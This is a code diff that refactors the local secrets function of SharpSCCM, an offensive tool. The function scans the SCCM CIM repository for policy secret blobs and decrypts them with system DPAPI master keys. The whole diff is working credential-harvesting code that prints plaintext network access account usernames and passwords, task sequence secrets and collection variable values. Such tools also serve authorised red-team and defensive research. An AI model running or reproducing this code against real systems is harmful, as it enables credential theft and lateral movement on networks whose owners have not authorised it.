@@ -1,11 +1,8 @@
-﻿using Microsoft.ConfigurationManagement.Messaging.Messages;
-using System;
-using System.Collections;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Management;
-using System.Reflection;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -13,10 +10,10 @@ namespace SharpSCCM
 {
     public class Credentials
     {
-        public static void LocalSecretsDisk(string secretType = "all", bool reg = true)
+        public static void LocalSecretsDisk(bool reg = true)
         {
             // Thanks to @guervild on GitHub for contributing this code to SharpDPAPI
-            Console.WriteLine($"[+] Retrieving {secretType} secret blobs from CIM repository\n");
+            Console.WriteLine($"[+] Retrieving secret blobs from CIM repository\n");
 
             string fileData = "";
             MemoryStream ms = new MemoryStream();
@@ -39,135 +36,86 @@ namespace SharpSCCM
                 {
                     fileData = sr.ReadToEnd();
                 }
-                Regex allSecretsRegex = new Regex(pattern: @"<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
-                Regex networkAccessAccountRegex = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
-                Regex taskSequenceRegex = new Regex(@"</SWDReserved>.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
-                Regex collectionVariableRegex = new Regex(@"CCM_CollectionVariable.*<PolicySecret Version=""1""><!\[CDATA\[(.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
 
-                MatchCollection allSecretsMatches = allSecretsRegex.Matches(fileData);
-                MatchCollection networkAccessAccountMatches = networkAccessAccountRegex.Matches(fileData);
-                MatchCollection taskSequenceMatches = taskSequenceRegex.Matches(fileData);
-                MatchCollection collectionVariableMatches = collectionVariableRegex.Matches(fileData);
+                // Define patterns to match in OBJECTS.DATA
+                var regexes = new Dictionary<string, Regex>()
+                {
+                    { "networkAccessAccounts", new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(?<NetworkAccessPassword>.*?)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(?<NetworkAccessUsername>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) },
+                    { "taskSequences" , new Regex(@"</SWDReserved>.*<PolicySecret Version=""1""><!\[CDATA\[(?<TaskSequence>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) },
+                    { "collectionVariables", new Regex(@"CCM_CollectionVariable\x00\x00(?<CollectionVariableName>.*?)\x00\x00.*<PolicySecret Version=""1""><!\[CDATA\[(?<CollectionVariableValue>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) },
+                    { "allSecrets", new Regex(pattern: @"<PolicySecret Version=""1""><!\[CDATA\[(?<OtherSecret>.*?)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled) }
+                };
 
-                // Convert the MatchCollection objects to List<Match> so they can be compared
-                List<Match> allSecretsMatchesList = allSecretsMatches.Cast<Match>().ToList();
-                List<Match> networkAccessAccountMatchesList = networkAccessAccountMatches.Cast<Match>().ToList();
-                List<Match> taskSequenceMatchesList = taskSequenceMatches.Cast<Match>().ToList();
-                List<Match> collectionVariableMatchesList = collectionVariableMatches.Cast<Match>().ToList();
+                // Inspect OBJECTS.DATA for matches and convert the MatchCollection objects to List<Match> so they can be compared
+                var matches = new Dictionary<string, List<Match>>()
+                {
+                    { "network access account", regexes["networkAccessAccounts"].Matches(fileData).Cast<Match>().ToList() },
+                    { "task sequence", regexes["taskSequences"].Matches(fileData).Cast<Match>().ToList() },
+                    { "collection variable", regexes["collectionVariables"].Matches(fileData).Cast<Match>().ToList() },
+                    { "other", regexes["allSecrets"].Matches(fileData).Cast<Match>().ToList() }
+                };
 
                 // Don't touch DPAPI unless there are secrets to decrypt
-                if (allSecretsMatches.Count > 0)
+                if (matches["other"].Count > 0)
                 {
                     Dictionary<string, string> masterkeys;
                     masterkeys = Dpapi.TriageSystemMasterKeys(reg);
-                    
-                    // Decrypt network access accounts
-                    if (networkAccessAccountMatchesList.Count > 0)
+
+                    // Decrypt each secret type if there are secrets to decrypt
+                    foreach (var matchKeyValuePair in matches)
                     {
-                        Console.WriteLine("\n[+] Decrypting network access account secrets\n");
-                        for (int index = 0; index < networkAccessAccountMatchesList.Count; index++)
+                        if (matchKeyValuePair.Value.Count > 0)
                         {
-                            for (int idxGroup = 1; idxGroup < networkAccessAccountMatchesList[index].Groups.Count; idxGroup++)
+                            Console.WriteLine($"\n\n[+] Decrypting {matchKeyValuePair.Value.Count} {matchKeyValuePair.Key} secrets");
+
+                            for (int index = 0; index < matchKeyValuePair.Value.Count; index++)
                             {
-                                try
+                                for (int idxGroup = 1; idxGroup < matchKeyValuePair.Value[index].Groups.Count; idxGroup++)
                                 {
-                                    string secretPlaintext = Dpapi.Execute(networkAccessAccountMatchesList[index].Groups[idxGroup].Value, masterkeys);
-                                    Console.WriteLine("    Plaintext NAA: {0}", secretPlaintext);
-                                    Console.WriteLine();
+                                    try
+                                    {
 
-                                    // Remove network access accounts from remaining secrets to display, courtesy of ChatGPT
-                                    allSecretsMatchesList.RemoveAll(item1 => networkAccessAccountMatchesList.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine("[!] Data was not decrypted");
-                                    Console.WriteLine(e.ToString());
-                                }
-                            }
-                        }
-                    }
-                    else
-                    {
-                        Console.WriteLine("\n[+] No network access account secrets found\n");
-                    }
+                                        // Add collection variable names and values together
+                                        if (matchKeyValuePair.Value[index].Groups[idxGroup].Name == "CollectionVariableName")
+                                        {
+                                            string collectionVariableValue = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup + 1].Value, masterkeys);
+                                            Console.WriteLine($"\n    CollectionVariableName: {matchKeyValuePair.Value[index].Groups[idxGroup].Value}");
+                                            Console.WriteLine($"    CollectionVariableValue: {collectionVariableValue}");
+                                        }
+                                        // Add network access usernames and passwords together
+                                        else if (matchKeyValuePair.Value[index].Groups[idxGroup].Name == "NetworkAccessPassword")
+                                        {
+                                            string networkAccessUsername = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup + 1].Value, masterkeys);
+                                            string networkAccessPassword = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup].Value, masterkeys);
+                                            Console.WriteLine($"\n    NetworkAccessUsername: {networkAccessUsername}");
+                                            Console.WriteLine($"    NetworkAccessPassword: {networkAccessPassword}");
 
-                    // Decrypt task sequences
-                    if (taskSequenceMatchesList.Count > 0)
-                    {
-                        Console.WriteLine("\n[+] Decrypting task sequence secrets\n");
-                        for (int index = 0; index < taskSequenceMatchesList.Count; index++)
-                        {
-                            for (int idxGroup = 1; idxGroup < taskSequenceMatchesList[index].Groups.Count; idxGroup++)
-                            {
-                                try
-                                {
-                                    string secretPlaintext = Dpapi.Execute(taskSequenceMatchesList[index].Groups[idxGroup].Value, masterkeys);
-                                    Console.WriteLine($"    Plaintext: {secretPlaintext}");
-
-                                    // Remove collection variables from remaining secrets to display, courtesy of ChatGPT
-                                    allSecretsMatchesList.RemoveAll(item1 => taskSequenceMatchesList.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
+                                            //secrets.Add(new KeyValuePair<string, string>("\n    " + matchKeyValuePair.Value[index].Groups[idxGroup + 1].Name, secretPlaintext));
+                                            //secrets.Add(new KeyValuePair<string, string>(matchKeyValuePair.Value[index].Groups[idxGroup].Name, secretPlaintext));
+                                        }
+                                        else if (matchKeyValuePair.Value[index].Groups[idxGroup].Name == "CollectionVariableValue" || matchKeyValuePair.Value[index].Groups[idxGroup].Name == "NetworkAccessUsername")
+                                        {
+                                            // Do nothing, these are already added
+                                        }
+                                        else 
+                                        {
+                                            string secretPlaintext = Dpapi.Execute(matchKeyValuePair.Value[index].Groups[idxGroup].Value, masterkeys);
+                                            Console.WriteLine($"\n    Plaintext secret: {secretPlaintext}");
+                                        }
+                                        
+                                        // Remove secret type from remaining secrets to display, courtesy of ChatGPT
+                                        if (matchKeyValuePair.Key != "other")
+                                        {
+                                            matches["other"].RemoveAll(item1 => matchKeyValuePair.Value.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
+                                        }
+                                    }
+                                    catch (Exception e)
+                                    {
+                                        Console.WriteLine("\n[!] Data was not decrypted");
+                                        Console.WriteLine(e.ToString());
+                                        Console.WriteLine($"[!] Data: {matchKeyValuePair.Value[index].Groups[idxGroup].Value}");
+                                    }
                                 }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine("[!] Data was not decrypted");
-                                    Console.WriteLine(e.ToString());
-                                }
-                            }
-                        }
-                    }
-                    else
-                    {
-                        Console.WriteLine("\n[+] No task sequence secrets found\n");
-                    }
-
-                    // Decrypt collection variables
-                    if (collectionVariableMatchesList.Count > 0)
-                    {
-                        Console.WriteLine("\n[+] Decrypting collection variable secrets\n");
-                        for (int index = 0; index < collectionVariableMatchesList.Count; index++)
-                        {
-                            for (int idxGroup = 1; idxGroup < collectionVariableMatchesList[index].Groups.Count; idxGroup++)
-                            {
-                                try
-                                {
-                                    string secretPlaintext = Dpapi.Execute(collectionVariableMatchesList[index].Groups[idxGroup].Value, masterkeys);
-                                    Regex collectionVariableNameRegex = new Regex(@"CCM_CollectionVariable\x00\x00(.*?)\x00\x00.*<PolicySecret Version=""1"">", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
-                                    MatchCollection collectionVariableNameMatches = collectionVariableNameRegex.Matches(collectionVariableMatchesList[index].Value);
-                                    Console.WriteLine($"    Name:      {collectionVariableNameMatches[0].Groups[1].Value.Replace("\0", string.Empty)}");
-                                    Console.WriteLine($"    Plaintext: {secretPlaintext}");
-                                    Console.WriteLine();
-
-                                    // Remove collection variables from remaining secrets to display, courtesy of ChatGPT
-                                    allSecretsMatchesList.RemoveAll(item1 => collectionVariableMatchesList.Any(item2 => item1.Groups.Cast<Group>().Any(group1 => item2.Groups.Cast<Group>().Any(group2 => group2.Value == group1.Value))));
-                                }
-                                catch (Exception e)
-                                {
-                                    Console.WriteLine("[!] Data was not decrypted");
-                                    Console.WriteLine(e.ToString());
-                                }
-                            }
-                        }
-                    }
-                    else
-                    {
-                        Console.WriteLine("\n[+] No collection variable secrets found\n");
-                    }
-
-                    Console.WriteLine("\n[+] Decrypting other policy secrets\n");
-                    for (int index = 0; index < allSecretsMatchesList.Count; index++)
-                    {
-                        for (int idxGroup = 1; idxGroup < allSecretsMatchesList[index].Groups.Count; idxGroup++)
-                        {
-                            try
-                            {
-                                string secretPlaintext = Dpapi.Execute(allSecretsMatchesList[index].Groups[idxGroup].Value, masterkeys);
-                                    Console.WriteLine("    Plaintext secret: {0}", secretPlaintext);
-                                    Console.WriteLine();
-                            }
-                            catch (Exception e)
-                            {
-                                Console.WriteLine("[!] Data was not decrypted");
-                                Console.WriteLine(e.ToString());
                             }
                         }
                     }
